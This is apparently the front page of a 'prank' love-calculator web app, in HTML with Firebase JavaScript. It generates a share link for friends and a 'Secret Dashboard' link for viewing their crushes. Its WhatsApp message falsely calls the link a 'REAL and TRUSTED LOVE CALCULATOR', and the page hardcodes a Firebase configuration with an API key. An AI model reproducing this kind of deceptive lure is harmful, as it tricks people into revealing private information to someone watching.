<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Create Link</title>
<link rel="icon" href="love.jpg" type="image/png">
<link rel="stylesheet" href="style.css">
</head>
<body class="bg center">
<!-- Loader -->
<div id="loader1" class="loader1 hidden">
  <div class="spinner"></div>
  <p>Generating link...</p>
</div>
  
<div class="card create-card">
  <h2>Create Prank Link ğŸ˜ˆ</h2>
  <input id="name" placeholder="Your Name">
  <button class="btn" onclick="register()">Generate Links</button>

  <div id="links" style="display:none">

  <p>ğŸ”— Share this link</p>
  <div class="copy-row">
    <input id="shareLink" readonly>
    <button class="copy-btn" onclick="copyText('shareLink')">Copy</button>
  </div>

  <button class="wa-btn" onclick="shareWhatsApp()">Share on WhatsApp</button>

  <p style="margin-top:15px;"><b>Check your friend's crush on ğŸ” Secret Dashboard Link </b></p>
  <div class="copy-row">
    <input id="dashLink" readonly>
    <button class="copy-btn" onclick="copyText('dashLink')">Copy</button>
    
    <div id="toast" class="toast hidden">Copied âœ…</div>
  
  </div>
  <h3>Make sure to save Dashboard link</h3>
  <button class="btn go-dash-btn" onclick="goDashboard()">
  Go to Your Dashboard â†’
</button>

</div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyB1sYh3UGcubBmxmq70aMAURpolLBGM2_M",
  authDomain: "love-calculator-12.firebaseapp.com",
  projectId: "love-calculator-12",
  storageBucket: "love-calculator-12.firebasestorage.app",
  messagingSenderId: "707941034632",
  appId: "1:707941034632:web:7b6b5a7149b73f7e80cd3d",
  measurementId: "G-CW6SHK3C2T"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.register = async () => {
  const name = document.getElementById("name").value.trim();
  if (!name) return alert("Enter your name");

  // ğŸ”„ Show loader
  document.getElementById("loader1").classList.remove("hidden");

  const receiverId = crypto.randomUUID();
  const dashboardId = crypto.randomUUID();

  await addDoc(collection(db,"senders"),{
    senderName: name,
    receiverId,
    dashboardId,
    createdAt: Date.now()
  });

  document.getElementById("links").style.display="block";
  shareLink.value = `${location.origin}/prank.html?rid=${receiverId}`;
  dashLink.value = `${location.origin}/dashboard.html?sid=${dashboardId}`;

  DASHBOARD_LINK = dashLink.value;

  // âœ… Hide loader
  document.getElementById("loader1").classList.add("hidden");
};
</script>
<script>
function copyText(id) {
  const el = document.getElementById(id);
  el.select();
  el.setSelectionRange(0, 99999);
  navigator.clipboard.writeText(el.value);
  alert("Copied âœ…");
}

function shareWhatsApp() {
  const link = document.getElementById("shareLink").value;
  const msg = `Calculate your â¤ï¸ *LOVE Percentage* â¤ï¸ using this *REAL and TRUSTED LOVE CALCULATOR* 
ğŸ˜ğŸ‘¨â€â¤ï¸â€ğŸ‘¨ğŸ‘‡ğŸ‘‡ğŸ‘‡ğŸ‘¨â€â¤ï¸â€ğŸ‘¨ğŸ˜\n${link}`;
  window.open(
    "https://wa.me/?text=" + encodeURIComponent(msg),
    "_blank"
  );
}
</script>

<script>
let DASHBOARD_LINK = "";

function copyText(id) {
  const el = document.getElementById(id);
  navigator.clipboard.writeText(el.value);
  showToast("Copied âœ…");
}

function showToast(msg) {
  const t = document.getElementById("toast");
  t.innerText = msg;
  t.classList.remove("hidden");
  setTimeout(() => t.classList.add("hidden"), 2000);
}

function goDashboard() {
  if (!DASHBOARD_LINK) {
    alert("Generate link first");
    return;
  }
  window.location.href = DASHBOARD_LINK;
}
</script>

</body>
</html>
